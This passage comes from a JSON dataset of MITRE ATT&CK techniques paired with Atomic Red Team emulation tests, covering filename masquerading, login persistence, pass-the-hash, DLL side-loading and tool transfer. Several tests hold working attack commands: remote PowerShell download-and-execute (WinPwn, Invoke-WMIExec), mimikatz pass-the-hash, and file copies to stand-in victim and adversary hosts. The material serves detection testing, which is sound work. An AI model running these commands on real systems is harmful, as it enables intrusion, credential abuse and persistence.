"0bb64470-582a-4155-bde2-d6003a95ed34", "description": "Start PowerUpSQL Checks using powerSQL function of WinPwn", "supported_platforms": ["windows"], "executor": {"command": "$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'\niex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')\npowerSQL -noninteractive -consoleoutput", "name": "powershell"}}]}, "T1036.006": {"name": "Space after Filename", "technique_id": "attack-pattern--e51137a5-1cdc-499e-911a-abaedaa5ac86", "external_id": "T1036.006", "data_components": ["File Metadata"], "kill_chain_phases": ["defense-evasion"], "data_source_platforms": [], "mitigations": null, "description": "Adversaries can hide a program's true filetype by changing the extension of a file. With certain file types (specifically this does not work with .app extensions), appending a space to the end of a filename will change how the file is processed by the operating system.\n\nFor example, if there is a Mach-O executable file called <code>evil.bin</code>, when it is double clicked by a user, it will launch Terminal.app and execute. If this file is renamed to <code>evil.txt</code>, then when double clicked by a user, it will launch with the default text editing application (not executing the binary). However, if the file is renamed to <code>evil.txt </code> (note the space at the end), then when double clicked by a user, the true file type is determined by the OS and handled appropriately and the binary will be executed (Citation: Mac Backdoors are back).\n\nAdversaries can use this feature to trick users into double clicking benign-looking files of any format and ultimately executing something malicious.", "atomic_tests": [{"name": "Space After Filename (Manual)", "auto_generated_guid": "89a7dd26-e510-4c9f-9b15-f3bae333360f", "description": "Space After Filename\n", "supported_platforms": ["macos"], "executor": {"steps": "1. echo '#!/bin/bash\\necho \"print \\\"hello, world!\\\"\" | /usr/bin/python\\nexit' > execute.txt && chmod +x execute.txt\n\n2. mv execute.txt \"execute.txt \"\n\n3. ./execute.txt\\ \n", "name": "manual"}}, {"name": "Space After Filename", "auto_generated_guid": "b95ce2eb-a093-4cd8-938d-5258cef656ea", "description": "Space after filename.\n", "supported_platforms": ["macos", "linux"], "executor": {"name": "bash", "command": "mkdir -p /tmp/atomic-test-T1036.006\ncd /tmp/atomic-test-T1036.006\nmkdir -p 'testdirwithspaceend '\n/usr/bin/echo -e \"%d\\na\\n#!/usr/bin/perl\\nprint \\\"running T1035.006 with space after filename to masquerade init\\\\n\\\";\\nqx/cp \\/usr\\/bin\\/perl 'init  '/;\\nqx/'.\\/init  ' -e 'sleep 5'/;\\n.\\nwq\\n\" | ed 'testdirwithspaceend /init ' >/dev/null\nchmod +x 'testdirwithspaceend /init '\n'./testdirwithspaceend /init '\n", "cleanup_command": "rm -rf /tmp/atomic-test-T1036.006"}}, {"name": "Space After Filename (FreeBSD)", "auto_generated_guid": "cfc1fbb5-caae-4f4c-bfa8-1b7c8b5cc4e8", "description": "Space after filename.\n", "supported_platforms": ["linux"], "executor": {"name": "sh", "command": "mkdir -p /tmp/atomic-test-T1036.006\ncd /tmp/atomic-test-T1036.006\nmkdir -p 'testdirwithspaceend '\n/bin/echo \"#\\!/bin/sh\" > \"testdirwithspaceend /init \" && echo 'echo \"print(\\\"running T1035.006 with space after filename to masquerade init\\\")\" | python3.9' >> \"testdirwithspaceend /init \" && echo \"exit\" >> \"testdirwithspaceend /init \"      \nchmod +x 'testdirwithspaceend /init '\n'./testdirwithspaceend /init '\n", "cleanup_command": "rm -rf /tmp/atomic-test-T1036.006"}}]}, "T1547.007": {"name": "Re-opened Applications", "technique_id": "attack-pattern--e5cc9e7a-e61a-46a1-b869-55fb6eab058e", "external_id": "T1547.007", "data_components": ["File Modification", "Command Execution"], "kill_chain_phases": ["persistence", "privilege-escalation"], "data_source_platforms": [], "mitigations": ["course-of-action--2a4f6c11-a4a7-4cb9-b0ef-6ae1bb3a718a", "course-of-action--eb88d97c-32f1-40be-80f0-d61a4b0b4b31"], "description": "Adversaries may modify plist files to automatically run an application when a user logs in. When a user logs out or restarts via the macOS Graphical User Interface (GUI), a prompt is provided to the user with a checkbox to \"Reopen windows when logging back in\".(Citation: Re-Open windows on Mac) When selected, all applications currently open are added to a property list file named <code>com.apple.loginwindow.[UUID].plist</code> within the <code>~/Library/Preferences/ByHost</code> directory.(Citation: Methods of Mac Malware Persistence)(Citation: Wardle Persistence Chapter) Applications listed in this file are automatically reopened upon the user\u2019s next logon.\n\nAdversaries can establish [Persistence](https://attack.mitre.org/tactics/TA0003) by adding a malicious application path to the <code>com.apple.loginwindow.[UUID].plist</code> file to execute payloads when a user logs in.", "atomic_tests": [{"name": "Copy in loginwindow.plist for Re-Opened Applications", "auto_generated_guid": "5fefd767-ef54-4ac6-84d3-751ab85e8aba", "description": "Copy in new loginwindow.plist to launch Calculator.\n", "supported_platforms": ["macos"], "input_arguments": {"calc_plist_path": {"description": "path to binary plist with entry to open calculator", "type": "path", "default": "PathToAtomicsFolder/T1547.007/src/reopen_loginwindow_calc.plist"}}, "executor": {"command": "cp #{calc_plist_path} ~/Library/Preferences/ByHost/com.apple.loginwindow.plist\n", "cleanup_command": "rm -f ~/Library/Preferences/ByHost/com.apple.loginwindow.plist\n", "name": "sh"}}, {"name": "Re-Opened Applications using LoginHook", "auto_generated_guid": "5f5b71da-e03f-42e7-ac98-d63f9e0465cb", "description": "Mac Defaults\n\n[Reference](https://developer.apple.com/library/content/documentation/MacOSX/Conceptual/BPSystemStartup/Chapters/CustomLogin.html)\n", "supported_platforms": ["macos"], "input_arguments": {"script": {"description": "path to script", "type": "path", "default": "/path/to/script"}}, "executor": {"command": "sudo defaults write com.apple.loginwindow LoginHook #{script}\n", "cleanup_command": "sudo defaults delete com.apple.loginwindow LoginHook\n", "elevation_required": true, "name": "sh"}}, {"name": "Append to existing loginwindow for Re-Opened Applications", "auto_generated_guid": "766b6c3c-9353-4033-8b7e-38b309fa3a93", "description": "Appends an entry to launch Calculator hidden loginwindow.*.plist for next login.\nNote that the change may not result in the added Calculator program launching on next user login.\nIt may depend on which version of macOS you are running on.\n", "supported_platforms": ["macos"], "input_arguments": {"objc_source_path": {"description": "path to objective C program", "type": "path", "default": "PathToAtomicsFolder/T1547.007/src/append_reopen_loginwindow.m"}, "exe_path": {"description": "path to compiled program", "type": "path", "default": "/tmp/t1547007_append_exe"}}, "dependency_executor_name": "bash", "dependencies": [{"description": "compile C program\n", "prereq_command": "if [ -f \"#{exe_path}\" ]; then exit 0 ; else exit 1; fi\n", "get_prereq_command": "cc #{objc_source_path} -o #{exe_path} -framework Cocoa\n"}], "executor": {"command": "FILE=`find ~/Library/Preferences/ByHost/com.apple.loginwindow.*.plist -type f | head -1`\nif [ -z \"${FILE}\" ] ; then echo \"No loginwindow plist file found\" && exit 1 ; fi\necho save backup copy to /tmp/\ncp ${FILE} /tmp/t1547007_loginwindow-backup.plist\necho before\nplutil -p ${FILE}\necho overwriting...\n#{exe_path} ${FILE} && echo after && plutil -p ${FILE}\n", "cleanup_command": "rm -f #{exe_path}\n# revert to backup copy\nFILE=`find ~/Library/Preferences/ByHost/com.apple.loginwindow.*.plist -type f | head -1`\nif [ -z \"${FILE}\" ] ; then\n   exit 0\nfi\nmv /tmp/t1547007_loginwindow-backup.plist ${FILE}\n", "name": "sh"}}]}, "T1550.002": {"name": "Pass the Hash", "technique_id": "attack-pattern--e624264c-033a-424d-9fd7-fc9c3bbdb03e", "external_id": "T1550.002", "data_components": ["Active Directory Credential Request", "User Account Authentication", "Logon Session Creation"], "kill_chain_phases": ["defense-evasion", "lateral-movement"], "data_source_platforms": [], "mitigations": ["course-of-action--2c2ad92a-d710-41ab-a996-1db143bb4808", "course-of-action--93e7968a-9074-4eac-8ae9-9f5200ec3317", "course-of-action--9bb9e696-bff8-4ae1-9454-961fc7d91d5f", "course-of-action--e5d930e9-775a-40ad-9bdb-b941d8dfe86b"], "description": "Adversaries may \u201cpass the hash\u201d using stolen password hashes to move laterally within an environment, bypassing normal system access controls. Pass the hash (PtH) is a method of authenticating as a user without having access to the user's cleartext password. This method bypasses standard authentication steps that require a cleartext password, moving directly into the portion of the authentication that uses the password hash.\n\nWhen performing PtH, valid password hashes for the account being used are captured using a [Credential Access](https://attack.mitre.org/tactics/TA0006) technique. Captured hashes are used with PtH to authenticate as that user. Once authenticated, PtH may be used to perform actions on local or remote systems.\n\nAdversaries may also use stolen password hashes to \"overpass the hash.\" Similar to PtH, this involves using a password hash to authenticate as a user but also uses the password hash to create a valid Kerberos ticket. This ticket can then be used to perform [Pass the Ticket](https://attack.mitre.org/techniques/T1550/003) attacks.(Citation: Stealthbits Overpass-the-Hash)", "atomic_tests": [{"name": "Mimikatz Pass the Hash", "auto_generated_guid": "ec23cef9-27d9-46e4-a68d-6f75f7b86908", "description": "Note: must dump hashes first\n[Reference](https://github.com/gentilkiwi/mimikatz/wiki/module-~-sekurlsa#pth)\n", "supported_platforms": ["windows"], "input_arguments": {"user_name": {"description": "username", "type": "string", "default": "Administrator"}, "ntlm": {"description": "ntlm hash", "type": "string", "default": "cc36cf7a8514893efccd3324464tkg1a"}, "domain": {"description": "domain", "type": "string", "default": "%userdnsdomain%"}, "mimikatz_path": {"description": "mimikatz windows executable", "type": "path", "default": "%tmp%\\mimikatz\\x64\\mimikatz.exe"}}, "dependency_executor_name": "powershell", "dependencies": [{"description": "Mimikatz executor must exist on disk and at specified location (#{mimikatz_path})\n", "prereq_command": "$mimikatz_path = cmd /c echo #{mimikatz_path}\nif (Test-Path $mimikatz_path) {exit 0} else {exit 1}\n", "get_prereq_command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX (iwr \"https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-FetchFromZip.ps1\" -UseBasicParsing) \n$releases = \"https://api.github.com/repos/gentilkiwi/mimikatz/releases\"\n$zipUrl = (Invoke-WebRequest $releases | ConvertFrom-Json)[0].assets.browser_download_url | where-object { $_.endswith(\".zip\") }\n$mimikatz_exe = cmd /c echo #{mimikatz_path}\n$basePath = Split-Path $mimikatz_exe | Split-Path\nInvoke-FetchFromZip $zipUrl \"x64/mimikatz.exe\" $basePath\n"}], "executor": {"command": "#{mimikatz_path} \"sekurlsa::pth /user:#{user_name} /domain:#{domain} /ntlm:#{ntlm}\"\n", "name": "command_prompt"}}, {"name": "crackmapexec Pass the Hash", "auto_generated_guid": "eb05b028-16c8-4ad8-adea-6f5b219da9a9", "description": "command execute with crackmapexec\n", "supported_platforms": ["windows"], "input_arguments": {"user_name": {"description": "username", "type": "string", "default": "Administrator"}, "crackmapexec_exe": {"description": "crackmapexec windows executable", "type": "path", "default": "C:\\CrackMapExecWin\\crackmapexec.exe"}, "command": {"description": "command to execute", "type": "string", "default": "whoami"}, "ntlm": {"description": "command", "type": "string", "default": "cc36cf7a8514893efccd3324464tkg1a"}, "domain": {"description": "domain", "type": "string", "default": "%userdnsdomain%"}}, "dependency_executor_name": "powershell", "dependencies": [{"description": "CrackMapExec executor must exist on disk at specified location (#{crackmapexec_exe})\n", "prereq_command": "if(Test-Path #{crackmapexec_exe}) {exit 0} else {exit 1}\n", "get_prereq_command": "Write-Host Automated installer not implemented yet, please install crackmapexec manually at this location: #{crackmapexec_exe}\n"}], "executor": {"command": "#{crackmapexec_exe} #{domain} -u #{user_name} -H #{ntlm} -x #{command}\n", "name": "command_prompt"}}, {"name": "Invoke-WMIExec Pass the Hash", "auto_generated_guid": "f8757545-b00a-4e4e-8cfb-8cfb961ee713", "description": "Use Invoke-WMIExec to Pass the Hash\nNote: must dump hashes first\n[Reference](https://github.com/gentilkiwi/mimikatz/wiki/module-~-sekurlsa#pth)", "supported_platforms": ["windows"], "input_arguments": {"ntlm": {"description": "ntlm hash", "type": "string", "default": "cc36cf7a8514893efccd3324464tkg1a"}, "user_name": {"description": "username", "type": "string", "default": "Administrator"}, "command": {"description": "Command to run on target system", "type": "string", "default": "hostname"}, "target": {"description": "System to run command on", "type": "string", "default": "$env:COMPUTERNAME"}}, "executor": {"command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX (IWR 'https://raw.githubusercontent.com/Kevin-Robertson/Invoke-TheHash/01ee90f934313acc7d09560902443c18694ed0eb/Invoke-WMIExec.ps1' -UseBasicParsing);Invoke-WMIExec -Target #{target} -Username #{user_name} -Hash #{ntlm} -Command #{command}", "name": "powershell"}}]}, "T1574.002": {"name": "DLL Side-Loading", "technique_id": "attack-pattern--e64c62cf-9cd7-4a14-94ec-cdaac43ab44b", "external_id": "T1574.002", "data_components": ["Process Creation", "File Creation", "File Modification", "Module Load"], "kill_chain_phases": ["persistence", "privilege-escalation", "defense-evasion"], "data_source_platforms": [], "mitigations": ["course-of-action--25dc1ce8-eb55-4333-ae30-a7cb4f5894a1", "course-of-action--e5d930e9-775a-40ad-9bdb-b941d8dfe86b"], "description": "Adversaries may execute their own malicious payloads by side-loading DLLs. Similar to [DLL Search Order Hijacking](https://attack.mitre.org/techniques/T1574/001), side-loading involves hijacking which DLL a program loads. But rather than just planting the DLL within the search order of a program then waiting for the victim application to be invoked, adversaries may directly side-load their payloads by planting then invoking a legitimate application that executes their payload(s).\n\nSide-loading takes advantage of the DLL search order used by the loader by positioning both the victim application and malicious payload(s) alongside each other. Adversaries likely use side-loading as a means of masking actions they perform under a legitimate, trusted, and potentially elevated system or software process. Benign executables used to side-load payloads may not be flagged during delivery and/or execution. Adversary payloads may also be encrypted/packed or otherwise obfuscated until loaded into the memory of the trusted process.(Citation: FireEye DLL Side-Loading)", "atomic_tests": [{"name": "DLL Side-Loading using the Notepad++ GUP.exe binary", "auto_generated_guid": "65526037-7079-44a9-bda1-2cb624838040", "description": "GUP is an open source signed binary used by Notepad++ for software updates, and is vulnerable to DLL Side-Loading, thus enabling the libcurl dll to be loaded.\nUpon execution, calc.exe will be opened.\n", "supported_platforms": ["windows"], "input_arguments": {"process_name": {"description": "Name of the created process", "type": "string", "default": "calculator.exe"}, "gup_executable": {"description": "GUP is an open source signed binary used by Notepad++ for software updates", "type": "path", "default": "PathToAtomicsFolder\\T1574.002\\bin\\GUP.exe"}}, "dependency_executor_name": "powershell", "dependencies": [{"description": "Gup.exe binary must exist on disk at specified location (#{gup_executable})\n", "prereq_command": "if (Test-Path \"#{gup_executable}\") {exit 0} else {exit 1}\n", "get_prereq_command": "New-Item -Type Directory (split-path \"#{gup_executable}\") -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1574.002/bin/GUP.exe?raw=true\" -OutFile \"#{gup_executable}\"\n"}], "executor": {"command": "\"#{gup_executable}\"\n", "cleanup_command": "taskkill /F /IM #{process_name} >nul 2>&1\n", "name": "command_prompt"}}, {"name": "DLL Side-Loading using the dotnet startup hook environment variable", "auto_generated_guid": "d322cdd7-7d60-46e3-9111-648848da7c02", "description": "Utilizing the dotnet_startup_hooks environment variable, this method allows for registering a global method in an assembly that will be executed whenever a .net core application is started. This unlocks a whole range of scenarios, from injecting a profiler to tweaking a static context in a given environment. [blog post](https://medium.com/criteo-engineering/c-have-some-fun-with-net-core-startup-hooks-498b9ad001e1)\n", "supported_platforms": ["windows"], "input_arguments": {"process_name": {"description": "Name of the created process", "type": "string", "default": "calculator.exe"}, "preloader_dll": {"description": "library for interfacing with the dotnet framework", "type": "path", "default": "PathToAtomicsFolder\\T1574.002\\bin\\preloader.dll"}}, "dependency_executor_name": "powershell", "dependencies": [{"description": ".Net SDK must be installed\n", "prereq_command": "if (Test-Path \"C:\\Program Files\\dotnet\\dotnet.exe\") {exit 0} else {exit 1}\n", "get_prereq_command": "winget install Microsoft.DotNet.SDK.6 --accept-source-agreements --accept-package-agreements -h > $null\necho.\n"}, {"description": "preloader must exist\n", "prereq_command": "if (Test-Path \"#{preloader_dll}\") {exit 0} else {exit 1}\n", "get_prereq_command": "Invoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1574.002/bin/preloader?raw=true\" -OutFile \"#{preloader_dll}\"\n"}], "executor": {"command": "set DOTNET_STARTUP_HOOKS=\"#{preloader_dll}\"\ndotnet -h > nul\necho.\n", "cleanup_command": "taskkill /F /IM #{process_name} >nul 2>&1\n", "name": "command_prompt"}}]}, "T1105": {"name": "Ingress Tool Transfer", "technique_id": "attack-pattern--e6919abc-99f9-4c6c-95a5-14761e7b2add", "external_id": "T1105", "data_components": ["Network Traffic Flow", "Network Connection Creation", "Network Traffic Content", "File Creation"], "kill_chain_phases": ["command-and-control"], "data_source_platforms": [], "mitigations": ["course-of-action--12241367-a8b7-49b4-b86e-2236901ba50c"], "description": "Adversaries may transfer tools or other files from an external system into a compromised environment. Tools or files may be copied from an external adversary-controlled system to the victim network through the command and control channel or through alternate protocols such as [ftp](https://attack.mitre.org/software/S0095). Once present, adversaries may also transfer/spread tools between victim devices within a compromised environment (i.e. [Lateral Tool Transfer](https://attack.mitre.org/techniques/T1570)). \n\nFiles can also be transferred using various [Web Service](https://attack.mitre.org/techniques/T1102)s as well as native or otherwise present tools on the victim system.(Citation: PTSecurity Cobalt Dec 2016)\n\nOn Windows, adversaries may use various utilities to download tools, such as `copy`, `finger`, [certutil](https://attack.mitre.org/software/S0160), and [PowerShell](https://attack.mitre.org/techniques/T1059/001) commands such as <code>IEX(New-Object Net.WebClient).downloadString()</code> and <code>Invoke-WebRequest</code>. On Linux and macOS systems, a variety of utilities also exist, such as `curl`, `scp`, `sftp`, `tftp`, `rsync`, `finger`, and `wget`.(Citation: t1105_lolbas)", "atomic_tests": [{"name": "rsync remote file copy (push)", "auto_generated_guid": "0fc6e977-cb12-44f6-b263-2824ba917409", "description": "Utilize rsync to perform a remote file copy (push)\n", "supported_platforms": ["linux", "macos"], "input_arguments": {"remote_path": {"description": "Remote path to receive rsync", "type": "path", "default": "/tmp/victim-files"}, "remote_host": {"description": "Remote host to copy toward", "type": "string", "default": "victim-host"}, "local_path": {"description": "Path of folder to copy", "type": "path", "default": "/tmp/adversary-rsync/"}, "username": {"description": "User account to authenticate on remote host", "type": "string", "default": "victim"}}, "dependency_executor_name": "sh", "dependencies": [{"description": "rsync must be installed on the machine \n", "prereq_command": "if [ -x \"$(command -v rsync)\" ]; then exit 0; else exit 1; fi\n", "get_prereq_command": "(pkg install -y rsync)||(sudo apt-get -y install rsync)\n"}], "executor": {"command": "rsync -r #{local_path} #{username}@#{remote_host}:#{remote_path}\n", "name": "sh", "elevation_required": true}}, {"name": "rsync remote file copy (pull)", "auto_generated_guid": "3180f7d5-52c0-4493-9ea0-e3431a84773f", "description": "Utilize rsync to perform a remote file copy (pull)\n", "supported_platforms": ["linux", "macos"], "input_arguments": {"remote_path": {"description": "Path of folder to copy", "type": "path", "default": "/tmp/adversary-rsync/"}, "remote_host": {"description": "Remote host to copy from", "type": "string", "default": "adversary-host"}, "local_path": {"description": "Local path to receive rsync", "type": "path", "default": "/tmp/victim-files"}, "username": {"description": "User account to authenticate on remote host", "type": "string", "default": "adversary"}}, "dependency_executor_name": "sh", "dependencies": [{"description": "rsync must be installed on the machine \n", "prereq_command": "if [ -x \"$(command -v rsync)\" ]; then exit 0; else exit 1; fi\n", "get_prereq_command": "(pkg install -y rsync)||(sudo apt-get -y install rsync)\n"}], "executor": {"command": "rsync -r #{username}@#{remote_host}:#{remote_path} #{local_path}\n", "name": "sh"}}, {"name": "scp remote file copy (push)", "auto_generated_guid": "83a49600-222b-4866-80a0-37736ad29344", "description": "Utilize scp to perform a remote file copy (push)\n", "supported_platforms": ["linux", "macos"], "input_arguments": {"remote_path": {"description": "Remote path to receive scp", "type": "path", "default": "/tmp/victim-files/"}, "local_file": {"description": "Path of file to copy", "type": "path", "default": "/tmp/adversary-scp"}, "remote_host": {"description": "Remote host to copy toward", "type": "string", "default": "victim-host"}, "username": {"description": "User account to authenticate on remote host", "type": "string", "default": "victim"}}, "executor": {"command": "scp #{local_file} #{username}@#{remote_host}:#{remote_path}\n", "name": "sh"}}, {"name": "scp remote file copy (pull)", "auto_generated_guid": "b9d22b9a-9778-4426-abf0-568ea64e9c33", "description": "Utilize scp to perform a remote file copy (pull)\n", "supported_platforms": ["linux", "macos"], "input_arguments": {"remote_host": {"description": "Remote host to copy from", "type": "string", "default": "adversary-host"}, "local_path": {"description": "Local path to receive scp", "type": "path", "default": "/tmp/victim-files/"}, "remote_file": {"description": "Path of file to copy", "type": "path", "default": "/tmp/adversary-scp"}, "username": {"description": "User account to authenticate on remote host", "type": "string", "default": "adversary"}}, "executor": {"command": "scp #{username}@#{remote_host}:#{remote_file} #{local_path}\n", "name": "sh"}}, {"name": "sftp remote file copy (push)", "auto_generated_guid": "f564c297-7978-4aa9-b37a-d90477feea4e", "description": "Utilize sftp to perform a remote file copy (push)\n", "supported_platforms": ["linux", "macos"], "input_arguments": {"remote_path": {"description": "Remote path to receive sftp", "type": "path", "default": "/tmp/victim-files/"}, "local_file": {"description": "Path of file to copy", "type": "path", "default": "/tmp/adversary-sftp"}, "remote_host": {"description": "Remote host to copy toward", "type": "string", "default": "victim-host"}, "username": {"description": "User account to authenticate on remote host", "type": "string", "default": "victim"}}, "executor": {"command": "sftp #{username}@#{remote_host}:#{remote_path} <<< $'put #{local_file}'\n", "name": "sh"}}, {"name": "sftp remote file copy (pull)", "auto_generated_guid": "0139dba1-f391-405e-a4f5-f3989f2c88ef", "description": "Utilize sftp to perform a remote file copy (pull)\n", "supported_platforms": ["linux", "macos"], "input_arguments": {"remote_host": {"description": "Remote host to copy from", "type": "string", "default": "adversary-host"}, "local_path": {"description": "Local path to receive sftp", "type": "path", "default": "/tmp/victim-files/"}, "remote_file": {"description": "Path of file to copy", "type": "path", "default": "/tmp/adversary-sftp"}, "username": {"description": "User account to authenticate on remote host", "type": "string", "default": "adversary"}}, "executor": {"command": "sftp #{username}@#{remote_host}:#{remote_file} #{local_path}\n", "name": "sh"}}, {"name": "certutil download (urlcache)", "auto_generated_guid": "dd3b61dd-7bbc-48cd-ab51-49ad1a776df0", "description": "Use certutil -urlcache argument to download a file from the web. Note - /urlcache also works!\n", "supported_platforms": ["windows"], "input_arguments": {"remote_file": {"description": "URL of file to copy", "type": "url", "default": "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt"}, "local_path": {"description": "Local path to place file", "type": "path", "default": "Atomic-license.txt"}}, "executor": {"command": "cmd /c certutil -urlcache -split -f #{remote_file} #{local_path}\n", "cleanup_command": "del #{local_path} >nul 2>&1\n", "name": "command_prompt"}}, {"name": "certutil download (verifyctl)", "auto_generated_guid": "ffd492e3-0455-4518-9fb1-46527c9f241b", "description": "Use certutil -verifyctl argument to download a file from the web. Note - /verifyctl also works!\n", "supported_platforms": ["windows"], "input_arguments": {"remote_file": {"description": "URL of file to copy", "type": "url", "default": "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt"}, "local_path": {"description": "Local path to place file", "type": "path", "default": "Atomic-license.txt"}}, "executor": {"command": "$datePath = \"certutil-$(Get-Date -format yyyy_MM_dd)\"\nNew-Item -Path $datePath -ItemType Directory\nSet-Location $datePath\ncertutil -verifyctl -split -f #{remote_file}\nGet-ChildItem | Where-Object {$_.Name -notlike \"*.txt\"} | Foreach-Object { Move-Item $_.Name -Destination #{local_path} }\n", "cleanup_command": "Remove-Item \"certutil-$(Get-Date -format yyyy_MM_dd)\" -Force -Recurse -ErrorAction Ignore\n", "name": "powershell"}}, {"name": "Windows - BITSAdmin BITS Download", "auto_generated_guid": "a1921cd3-9a2d-47d5-a891-f1d0f2a7a31b", "description": "This test uses BITSAdmin.exe to schedule a BITS job for the download of a file.\nThis technique is used by Qbot malware to download payloads.\n", "supported_platforms": ["windows"], "input_arguments": {"bits_job_name": {"description": "Name of the created BITS job", "type": "string", "default": "qcxjb7"}, "local_path": {"description": "Local path to place file", "type": "path", "default": "%temp%\\Atomic-license.txt"}, "remote_file": {"description": "URL of file to copy", "type": "url", "default": "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt"}}, "executor": {"command": "C:\\Windows\\System32\\bitsadmin.exe /transfer #{bits_job_name} /Priority HIGH #{remote_file} #{local_path}\n", "name": "command_prompt"}}, {"name": "Windows - PowerShell Download", "auto_generated_guid": "42dc4460-9aa6-45d3-b1a6-3955d34e1fe8", "description": "This test uses PowerShell to download a payload.\nThis technique is used by multiple adversaries and malware families.\n", "supported_platforms": ["windows"], "input_arguments": {"remote_file": {"description": "URL of file to copy", "type": "url", "default": "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt"}, "destination_path": {"description": "Destination path to file", "type": "path", "default": "$env:TEMP\\Atomic-license.txt"}}, "executor": {"command": "(New-Object System.Net.WebClient).DownloadFile(\"#{remote_file}\", \"#{destination_path}\")\n", "cleanup_command": "Remove-Item #{destination_path} -Force -ErrorAction Ignore\n", "name": "powershell"}}, {"name": "OSTAP Worming Activity", "auto_generated_guid": "2ca61766-b456-4fcf-a35a-1233685e1cad", "description": "OSTap copies itself in a specfic way to shares and secondary drives. This emulates the activity.\n", "supported_platforms": ["windows"], "input_arguments": {"destination_path": {"description": "Path to create remote file at. Default is local admin share.", "type": "string", "default": "\\\\localhost\\C$"}}, "executor": {"command": "pushd #{destination_path}\necho var fileObject = WScript.createobject(\"Scripting.FileSystemObject\");var newfile = fileObject.CreateTextFile(\"AtomicTestFileT1105.js\", true);newfile.WriteLine(\"This is an atomic red team test file for T1105. It simulates how OSTap worms accross network shares and drives.\");newfile.Close(); > AtomicTestT1105.js\nCScript.exe AtomicTestT1105.js //E:JScript\ndel AtomicTestT1105.js /Q >nul 2>&1\ndel AtomicTestFileT1105.js /Q >nul 2>&1\npopd\n", "name": "command_prompt", "elevation_required": true}}, {"name": "svchost writing a file to a UNC path", "auto_generated_guid": "fa5a2759-41d7-4e13-a19c-e8f28a53566f", "description": "svchost.exe writing a non-Microsoft Office file to a file with a UNC path.\nUpon successful execution, this will rename cmd.exe as svchost.exe and move it to `c:\\`, then execute svchost.exe with output to a txt file.\n", "supported_platforms": ["windows"], "executor": {"command": "copy C:\\Windows\\System32\\cmd.exe C:\\svchost.exe\nC:\\svchost.exe /c echo T1105 > \\\\localhost\\c$\\T1105.txt\n", "cleanup_command": "del C:\\T1105.txt >nul 2>&1\ndel C:\\\\svchost.exe >nul 2>&1\n", "name": "command_prompt", "elevation_required": true}}, {"name": "Download a File with Windows Defender MpCmdRun.exe", "auto_generated_guid": "815bef8b-bf91-4b67-be4c-abe4c2a94ccc", "description": "Uses Windows Defender MpCmdRun.exe to download a file from the internet (must have version 4.18 installed).\nThe input arguments \"remote_file\" and \"local_path\" can be used to specify the download URL and the name of the output file.\nBy default, the test downloads the Atomic Red Team license file to the temp directory.\n\nMore info and how to find your version can be found here https://lolbas-project.github.io/lolbas/Binaries/MpCmdRun/\n", "supported_platforms": ["windows"], "input_arguments": {"remote_file": {"description": "URL of file to download", "type": "url", "default": "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt"}, "local_path": {"description": "Location to save downloaded file", "type": "path", "default": "%temp%\\Atomic-license.txt"}}, "dependencies": [{"description": "Must have a Windows Defender version with MpCmdRun.exe installed", "prereq_command": "cd \"%ProgramData%\\Microsoft\\Windows Defender\\platform\\4.18*\"\nMpCmdRun.exe /?  >nul 2>&1\n", "get_prereq_command": "Echo \"A version of Windows Defender with MpCmdRun.exe must be installed manually\""}], "executor": {"command": "cd \"%ProgramData%\\Microsoft\\Windows Defender\\platform\\4.18*\"\nMpCmdRun.exe -DownloadFile -url #{remote_file} -path #{local_path}\n", "cleanup_command": "del #{local_path} >nul 2>&1\ndel %temp%\\MpCmdRun.log >nul 2>&1", "name": "command_prompt"}}, {"name": "whois file download", "auto_generated_guid": "c99a829f-0bb8-4187-b2c6-d47d1df74cab", "description": "Download a remote file using the whois utility\n", "supported_platforms": ["linux", "macos"], "input_arguments": {"remote_host": {"description": "Remote hostname or IP address", "type": "string", "default": "localhost"}, "remote_port": {"description": "Remote port to connect to", "type": "integer", "default": 8443}, "output_file": {"description": "Path of file to save output to", "type": "path", "default": "/tmp/T1105.whois.out"}, "query": {"description": "Query to send to remote server", "type": "string", "default": "Hello from Atomic Red Team test T1105"}, "timeout": {"description": "Timeout period before ending process (seconds)", "type": "integer", "default": 1}}, "dependencies": [{"description": "The whois and timeout commands must be present\n", "prereq_command": "which whois && which timeout\n", "get_prereq_command": "echo \"Please install timeout and the whois package\"\n"}], "executor": {"name": "sh", "elevation_required": false, "command": "timeout --preserve-status #{timeout} whois -h #{remote_host} -p #{remote_port} \"#{query}\" > #{output_file}\n", "cleanup_command": "rm -f #{output_file}\n"}}, {"name": "File Download via PowerShell", "auto_generated_guid": "54a4daf1-71df-4383-9ba7-f1a295d8b6d2", "description": "Use PowerShell to download and write an arbitrary file from the internet. Example is from the 2021 Threat Detection Report by Red Canary.\n", "supported_platforms": ["windows"], "input_arguments": {"target_remote_file": {"description": "File to download", "type": "url", "default": "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/4042cb3433bce024e304500dcfe3c5590571573a/LICENSE.txt"}, "output_file": {"description": "File to write to", "type": "string", "default": "LICENSE.txt"}}, "executor": {"command": "(New-Object Net.WebClient).DownloadString('#{target_remote_file}') | Out-File #{output_file}; Invoke-Item #{output_file}\n", "name": "powershell"}}, {"name": "File download with finger.exe on Windows", "auto_generated_guid": "5f507e45-8411-4f99-84e7-e38530c45d01", "description": "Simulate a file download using finger.exe. Connect to localhost by default, use custom input argument to test finger connecting to an external server.\nBecause this is being tested on the localhost, you should not be expecting a successful connection\nhttps://www.exploit-db.com/exploits/48815\nhttps://www.bleepingcomputer.com/news/security/windows-10-finger-command-can-be-abused-to-download-or-steal-files/\n", "supported_platforms": ["windows"], "input_arguments": {"remote_host": {"description": "Remote hostname or IP address", "type": "string", "default": "localhost"}}, "executor": {"name": 